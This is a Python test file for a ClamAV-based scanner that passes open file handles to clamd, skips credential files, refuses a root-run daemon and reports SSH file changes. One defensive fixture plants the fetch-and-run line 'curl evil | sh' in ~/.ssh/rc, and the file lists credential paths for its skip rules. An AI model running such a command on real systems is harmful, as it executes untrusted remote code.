"""Tests for passing open files to clamd, and for credential files never
being opened. Run: python3 fdpass_test.py

Run it as your normal user, not root: one check makes sure Ensign refuses
a clamd running as root, and this test's fake clamd runs as whoever runs
the test.

Optional live check against your real clamd:
    ENSIGN_TEST_CLAMD_SOCKET=/run/clamav/clamd.ctl python3 fdpass_test.py
It writes the harmless EICAR test string to a private temp file, scans it
through Ensign, and deletes it.
"""
from __future__ import annotations

import contextlib
import hashlib
import io
import os
import re
import socket
import socketserver
import sqlite3
import stat
import tempfile
import threading
import time
from pathlib import Path

from sqlalchemy.orm import Session

from ensign_scan import secrets
from ensign_scan.clamd import ClamdClient, ScanOutcome, _effective_uid, _pids_named
from ensign_scan.config import Config
from ensign_scan.db import make_engine
from ensign_scan.fsutil import NotScannable, open_for_scan, sha256_fd
from ensign_scan.models import FileRecord, ScanStatus, utcnow
from ensign_scan.reports import integrity_report
from ensign_scan.scanner import ClamdRunsAsRoot, Scanner

_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def flat(text: str) -> str:
    return " ".join(_ANSI.sub("", text).split())


def quietly(fn, *args, **kwargs):
    with contextlib.redirect_stdout(io.StringIO()) as buf:
        result = fn(*args, **kwargs)
    return result, buf.getvalue()


tmp = Path(tempfile.mkdtemp(prefix="ensign_fdpass_"))

# ----------------------------------------------------------------------
# 1. open_for_scan: regular files only, symlinks followed, never blocks
# ----------------------------------------------------------------------
regular = tmp / "regular.txt"
regular.write_bytes(b"hello world")
fd, st = open_for_scan(regular)
try:
    assert stat.S_ISREG(st.st_mode) and st.st_size == 11
    flags = os.get_blocking(fd), os.get_inheritable(fd)
    assert flags == (False, False), "opened non-blocking and close-on-exec"
    digest = sha256_fd(fd)
    assert digest == hashlib.sha256(b"hello world").hexdigest()
    assert os.lseek(fd, 0, os.SEEK_CUR) == 0, "hashing must not move the shared offset"
finally:
    os.close(fd)

link = tmp / "link.txt"
link.symlink_to(regular)
fd, st = open_for_scan(link)
os.close(fd)
assert st.st_size == 11, "a symlink to a file is followed to its target"

(tmp / "empty").write_bytes(b"")
os.mkfifo(tmp / "pipe")
(tmp / "adir").mkdir()
for name in ("empty", "pipe", "adir"):
    try:
        fd, _ = open_for_scan(tmp / name)
        os.close(fd)
        raise AssertionError(f"{name}: should not be opened for scanning")
    except NotScannable:
        pass  # the FIFO case returning at all proves O_NONBLOCK: no writer exists
print("open_for_scan test passed ✓")

# ----------------------------------------------------------------------
# 2. skip_reason: credential files skipped; persistence files and
#    executables never are
# ----------------------------------------------------------------------
H = "/home/u"
REG, EXE = 0o100600, 0o100755
cases = [
    (f"{H}/.ssh/id_ed25519", REG, True),
    (f"{H}/.ssh/id_ed25519", EXE, False),            # executable in .ssh: scanned
    (f"{H}/.gnupg/private-keys-v1.d/A.key", REG, True),
    (f"{H}/Passwords.kdbx", REG, True),
    (f"{H}/.aws/config", REG, True),                 # credentials config, not watched
    (f"{H}/.ssh/authorized_keys", REG, False),       # integrity-watched
    (f"{H}/.ssh/authorized_keys2", REG, False),
    (f"{H}/.ssh/config", REG, False),
    (f"{H}/.ssh/rc", REG, False),
    (f"{H}/.config/app/config", REG, False),         # not a secrets path at all
    (f"{H}/certs/server.pem", REG, False),           # MEDIUM: still scanned
    (f"{H}/notes/rc", REG, False),                   # "rc" outside .ssh
]
for path, mode, skipped in cases:
    got = secrets.skip_reason(path, path, mode) is not None
    assert got == skipped, f"{path} mode {oct(mode)}: skipped={got}, expected {skipped}"
assert secrets.skip_reason(f"{H}/docs/innocent.txt", f"{H}/.ssh/id_rsa", REG), \
    "a symlink whose target is a key is skipped too"
assert secrets.is_integrity_watched(f"{H}/.ssh/config")
assert not secrets.is_integrity_watched(f"{H}/.aws/config")
print("skip_reason test passed ✓")

# ----------------------------------------------------------------------
# 3. A fake clamd that speaks FILDES
# ----------------------------------------------------------------------
SEEN: list[str] = []


def _read_command(sock) -> tuple[str, bool]:
    is_z = sock.recv(1, socket.MSG_PEEK) == b"z"
    buf = b""
    while (b := sock.recv(1)) not in (b"", b"\0", b"\n"):  # 1 byte: keep the fd's byte
        buf += b
    text = buf.decode()
    return (text[1:] if text[:1] in "nz" else text), is_z


class Fake(socketserver.BaseRequestHandler):
    fildes = True
    silent = False

    def handle(self):
        sock = self.request
        cmd, is_z = _read_command(sock)
        end = "\0" if is_z else "\n"
        if cmd == "PING":
            sock.sendall(f"PONG{end}".encode())
        elif cmd == "VERSION":
            sock.sendall(f"ClamAV 1.5.0/1/Mon Jan  5 00:00:00 2026{end}".encode())
        elif cmd == "VERSIONCOMMANDS":
            extra = " FILDES" if self.fildes else ""
            sock.sendall(f"ClamAV 1.5.0/1/x| COMMANDS: SCAN PING{extra}{end}".encode())
        elif cmd == "FILDES":
            _, fds, _, _ = socket.recv_fds(sock, 1, 1)
            if self.silent:
                time.sleep(3)  # like real clamd: connection held open, no reply
                return
            if not fds:
                return
            path = os.readlink(f"/proc/self/fd/{fds[0]}")
            content = os.pread(fds[0], 4096, 0)
            os.close(fds[0])
            SEEN.append(path)
            verdict = "Test.Sig FOUND" if b"PAYLOAD" in content else "OK"
            sock.sendall(f"fd[{fds[0]}]: {verdict}{end}".encode())
        elif cmd.startswith("SCAN "):
            SEEN.append(cmd[5:])
            sock.sendall(f"{cmd[5:]}: OK{end}".encode())


class Silent(Fake):
    silent = True


def serve(handler) -> str:
    path = str(tmp / f"{handler.__name__}.sock")
    server = socketserver.ThreadingUnixStreamServer(path, handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return path


fake_sock = serve(Fake)
client = ClamdClient(fake_sock)
assert client.supports_fildes()
assert client.daemon_uid() == os.geteuid(), "SO_PEERCRED + /proc finds the server's real UID"
assert _effective_uid(os.getpid()) == os.geteuid()
with open(f"/proc/{os.getpid()}/comm") as f:
    assert os.getpid() in _pids_named(f.read().strip()), "name lookup used under socket activation"

payload = tmp / "payload.bin"
payload.write_bytes(b"xx PAYLOAD xx")
fd, _ = open_for_scan(payload)
try:
    out = client.scan_fd(fd, label=str(payload))
finally:
    os.close(fd)
assert out.status == ScanStatus.INFECTED and out.threat_name == "Test.Sig"
assert out.raw.startswith(f"{payload}: "), f"fd[N] label replaced with the path: {out.raw!r}"

silent = ClamdClient(serve(Silent), timeout=1.0)
fd, _ = open_for_scan(payload)
try:
    out = silent.scan_fd(fd, label="x")
finally:
    os.close(fd)
assert out.status == ScanStatus.ERROR and "timed out" in out.raw, \
    f"a clamd that never answers ends in an ERROR after the timeout: {out.raw!r}"
print("FILDES client test passed ✓")

# ----------------------------------------------------------------------
# 4. Fail closed: a root clamd is refused, before anything is opened
# ----------------------------------------------------------------------


class Stub:
    def __init__(self, uid):
        self.uid, self.calls = uid, []

    def daemon_uid(self):
        return self.uid

    def supports_fildes(self):
        return True

    def ping(self):
        return True

    def max_threads(self):
        return 4

    def signature_version(self):
        return 1

    def scan(self, path):
        self.calls.append(str(path))
        return ScanOutcome(ScanStatus.CLEAN, f"{path}: OK")

    def scan_fd(self, fd, label):
        self.calls.append(label)
        return ScanOutcome(ScanStatus.CLEAN, f"{label}: OK")


def scanner_with(clamd, name):
    return Scanner(Config(db_url=f"sqlite:///{tmp / name}.db", log_file=tmp / f"{name}.log",
                          clamd_socket=fake_sock, max_workers=2), clamd=clamd)


root_stub = Stub(uid=0)
root_scanner = scanner_with(root_stub, "root")
for attempt in (lambda: root_scanner.scan_tree(tmp / "adir"),
                lambda: root_scanner.process_file(regular)):
    try:
        quietly(attempt)
        raise AssertionError("a root clamd must be refused")
    except ClamdRunsAsRoot:
        pass
assert root_stub.calls == [], "nothing may be sent to a root clamd"
_, out = quietly(scanner_with(Stub(uid=None), "unknown").process_file, regular)
assert "Couldn't confirm which user clamd runs as" in flat(out), "unknown UID: warn, continue"
print("root-clamd refusal test passed ✓")

# ----------------------------------------------------------------------
# 5. Pipeline: credential files never reach clamd; SSH changes reported
# ----------------------------------------------------------------------
home = tmp / "home"
(home / ".ssh").mkdir(parents=True)
os.chmod(home / ".ssh", 0o700)
key = home / ".ssh" / "id_ed25519"
key.write_text("fake key with PAYLOAD")
auth = home / ".ssh" / "authorized_keys"
auth.write_text("ssh-ed25519 AAAA mine\n")
planted = home / ".ssh" / "helper"
planted.write_text("#!/bin/sh\n# PAYLOAD\n")
planted.chmod(0o755)
private = home / "private.txt"
private.write_text("PAYLOAD")
private.chmod(0o600)

SEEN.clear()
sc = scanner_with(None, "pipeline")  # None: a real ClamdClient on the fake socket
quietly(sc.scan_tree, home)
assert sc._transport == "fd"
assert str(key) not in SEEN, "a credential file must never reach clamd"
assert str(planted) in SEEN and str(private) in SEEN
assert sc.integrity_changes == [], "the first sighting is the baseline, not a change"
with Session(sc.engine) as s:
    rows = {r.filepath: r for r in s.query(FileRecord)}
assert rows[str(key)].scan_status == "classified" and rows[str(key)].file_hash == ""
assert rows[str(planted)].scan_status == "infected", "an executable in .ssh is scanned"
assert rows[str(private)].scan_status == "infected"
assert rows[str(auth)].scan_status == "clean"

auth.write_text("ssh-ed25519 AAAA mine\nssh-ed25519 AAAA intruder\n")
quietly(sc.scan_tree, home)
assert [c.path for c in sc.integrity_changes] == [str(auth)]
_, out = quietly(integrity_report, sc.integrity_changes)
assert "SSH FILES CHANGED SINCE LAST RUN (1)" in flat(out) and str(auth) in out

# A watched file that didn't exist before is a change too: creating
# authorized_keys is the most common way to plant a way back in.
sc.integrity_changes.clear()
rc = home / ".ssh" / "rc"
rc.write_text("curl evil | sh\n")
quietly(sc.scan_tree, home)
assert [(c.path, c.old_hash) for c in sc.integrity_changes] == [(str(rc), "")]
_, out = quietly(integrity_report, sc.integrity_changes)
assert "new file since the last run" in flat(out)

# A file already found infected is never skipped, whatever its name.
npmrc = home / ".npmrc"                      # a HIGH credential filename
npmrc.write_text("PAYLOAD dropped here")
with Session(sc.engine) as s:
    s.add(FileRecord(filepath=str(npmrc), filename=".npmrc", file_hash="f" * 64,
                     scan_status="infected", threat_name="Test.Sig", last_scanned=utcnow()))
    s.commit()
SEEN.clear()
quietly(sc.process_file, npmrc)
assert str(npmrc) in SEEN, "a known infection is rescanned, not classified"
with Session(sc.engine) as s:
    assert s.query(FileRecord.scan_status).filter(FileRecord.filepath == str(npmrc)).scalar() == "infected"

# The symlink is re-pointed at a key between the check and the open: the
# check after open() (what the kernel says was opened) must catch it.
bait = home / "readme.txt"
bait.symlink_to(key)
import ensign_scan.scanner as scanner_mod
real_realpath = scanner_mod.os.path.realpath
scanner_mod.os.path.realpath = lambda p: str(private)   # the pre-open check is fooled
try:
    SEEN.clear()
    digest, _ = quietly(sc.process_file, bait)
finally:
    scanner_mod.os.path.realpath = real_realpath
assert digest == "" and str(key) not in SEEN, "caught after open, before reading"
print("pipeline test passed ✓")

# ----------------------------------------------------------------------
# 6. One-time upgrade of an old database
# ----------------------------------------------------------------------
db_path = tmp / "old.db"
engine = make_engine(f"sqlite:///{db_path}")
OLD_KEY_HASH = "deadbeef" * 8
rows = {
    "key": (f"{H}/.ssh/id_rsa", "classified", OLD_KEY_HASH, f"{H}/.ssh/id_rsa: Access denied. ERROR"),
    "auth": (f"{H}/.ssh/authorized_keys", "classified", "a" * 64, "denied"),
    "denied": (f"{H}/Games/data.pak", "error", "b" * 64, f"{H}/Games/data.pak: Access denied. ERROR"),
    "broken": (f"{H}/Games/odd.bin", "error", "c" * 64, f"{H}/Games/odd.bin: Can't parse. ERROR"),
    "clean": (f"{H}/docs/a.txt", "clean", "d" * 64, f"{H}/docs/a.txt: OK"),
    "infected": (f"{H}/.npmrc", "infected", "e" * 64, f"{H}/.npmrc: Test FOUND"),
}
with Session(engine) as s:
    for path, status, digest, result in rows.values():
        s.add(FileRecord(filepath=path, filename=os.path.basename(path), file_hash=digest,
                         scan_status=status, scan_result=result, mtime_ns=1, ctime_ns=1,
                         last_scanned=utcnow()))
    s.commit()
engine.dispose()
with sqlite3.connect(db_path) as raw:
    raw.execute("PRAGMA user_version = 0")  # pretend it was made by an older Ensign

engine, out = quietly(make_engine, f"sqlite:///{db_path}")
assert "One-time database upgrade" in out and "1 credential file(s); 2 file(s)" in out, out
with Session(engine) as s:
    got = {r.filepath: (r.file_hash, r.ctime_ns) for r in s.query(FileRecord)}
assert got[rows["key"][0]] == ("", None), "credential hash wiped, rescanned once"
assert got[rows["auth"][0]] == ("a" * 64, None), "watched file keeps its baseline hash"
assert got[rows["denied"][0]][1] is None, "permission-denied rows are retried"
assert got[rows["broken"][0]][1] == 1, "other errors are left alone"
assert got[rows["clean"][0]] == ("d" * 64, 1), "ordinary rows are untouched"
assert got[rows["infected"][0]] == ("e" * 64, 1), "a found infection keeps its record"
engine.dispose()
blob = b"".join(p.read_bytes() for p in tmp.glob("old.db*"))
assert OLD_KEY_HASH.encode() not in blob, "the old hash must be gone from the file on disk"

_, out = quietly(make_engine, f"sqlite:///{db_path}")
assert "One-time" not in out, "the upgrade runs once"
with sqlite3.connect(db_path) as raw:
    assert raw.execute("PRAGMA user_version").fetchone()[0] == 1
print("database upgrade test passed ✓")

# ----------------------------------------------------------------------
# 7. Optional: your real clamd
# ----------------------------------------------------------------------
real_socket = os.environ.get("ENSIGN_TEST_CLAMD_SOCKET")
if real_socket:
    real = ClamdClient(real_socket)
    assert real.ping(), f"no clamd answering on {real_socket}"
    uid = real.daemon_uid()
    assert uid != 0, "your clamd runs as root -- Ensign will refuse to use it"
    assert real.supports_fildes(), "your clamd doesn't offer FILDES"
    box = Path(tempfile.mkdtemp(prefix="ensign_live_"))
    box.chmod(0o700)
    eicar = box / "eicar.txt"
    eicar.write_bytes(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    eicar.chmod(0o600)
    try:
        path_mode = real.scan(eicar)
        live = Scanner(Config(db_url=f"sqlite:///{box / 'live.db'}", log_file=box / "live.log",
                              clamd_socket=real_socket, max_workers=1))
        quietly(live.process_file, eicar)
        with Session(live.engine) as s:
            rec = s.query(FileRecord).filter(FileRecord.filepath == str(eicar)).one()
        assert live._transport == "fd"
        assert rec.scan_status == "infected", f"expected EICAR to be found, got {rec.scan_result!r}"
        print(f"  clamd UID {uid}; path SCAN said: {path_mode.raw}")
        print(f"  through a passed handle:  {rec.scan_result}")
    finally:
        for p in box.iterdir():
            p.unlink()
        box.rmdir()
    print("live clamd test passed ✓")
else:
    print("live clamd test skipped (set ENSIGN_TEST_CLAMD_SOCKET to run it)")

print("\nAll fd-passing tests passed ✓")
